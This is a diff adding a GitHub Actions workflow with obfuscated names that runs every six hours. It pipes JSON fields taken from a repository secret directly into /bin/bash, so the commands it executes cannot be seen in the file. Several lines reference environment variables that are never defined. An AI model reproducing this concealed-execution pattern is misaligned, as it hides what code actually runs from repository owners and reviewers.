@@ -1,0 +1,21 @@
+name: dingdongyaa
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dingdongyaa
+        env:
+          dckic6: ${{ secrets.dckic6 }}
+        run: |
+          echo $dckic6 | jq -r .umct2 | /bin/bash
+          echo $t3867 | jq -r .nua240 | /bin/bash
+          echo $hoaa4747 | jq -r .gmjb2 | /bin/bash
+          echo $fpase76987 | jq -r .ulq5902 | /bin/bash
+          echo $km79489 | jq -r .njvmm71 | /bin/bash
+
